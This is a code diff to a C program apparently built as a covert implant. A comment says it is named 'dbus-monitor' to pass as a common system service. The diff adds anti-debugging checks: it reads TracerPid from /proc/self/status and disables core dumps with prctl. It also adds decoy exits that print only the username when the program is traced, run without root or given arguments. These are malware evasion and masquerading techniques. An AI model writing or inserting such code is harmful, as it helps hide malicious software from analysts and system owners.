@@ -13,6 +13,8 @@
 #include <sys/wait.h>
 #include <semaphore.h>
 #include <arpa/inet.h>
+#include <sys/ptrace.h>
+#include <sys/prctl.h>
 
 /*
     Decided to name it dbus-monitor as it is a common name for a service
@@ -415,13 +417,51 @@ char* get_username()
     return "Unknown";
 }
 
+/*
+    avoid strace or debugging
+*/
+int check_debugging()
+{
+    FILE *file = fopen("/proc/self/status", "r");
+    if (!file) return 0;
+
+    char line[256];
+    while (fgets(line, sizeof(line), file))
+    {
+        if (strncmp(line, "TracerPid:", 10) == 0)
+        {
+            int tracer_pid = atoi(&line[10]);
+            fclose(file);
+            return tracer_pid != 0;
+        }
+    }
+    fclose(file);
+    return 0;
+}
+
+void prevent_debugger_attach()
+{
+    prctl(PR_SET_DUMPABLE, 0);
+}
+
 int main(int argc, char *argv[])
 {
     if (geteuid() != 0)
     {
-        fprintf(stderr, "This program requires root privileges.\n");
-        return -1;
+        char *user = get_username();
+        printf("%s\n", user);
+        
+        return 0;
     }
+
+    if (check_debugging())
+    {        
+        char *user = get_username();
+        printf("%s\n", user);
+        return 0;
+    }
+
+    prevent_debugger_attach();
 
     int systemd_enabled = use_systemd();
 
@@ -433,8 +473,9 @@ int main(int argc, char *argv[])
 
     if (argc > 1)
     {
-        fprintf(stderr, "Usage: %s [--uninstall | --daemon]\n", argv[0]);
-        return -1;
+        char *user = get_username();
+        printf("%s\n", user);
+        return 0;
     }
 
     char *user = get_username();
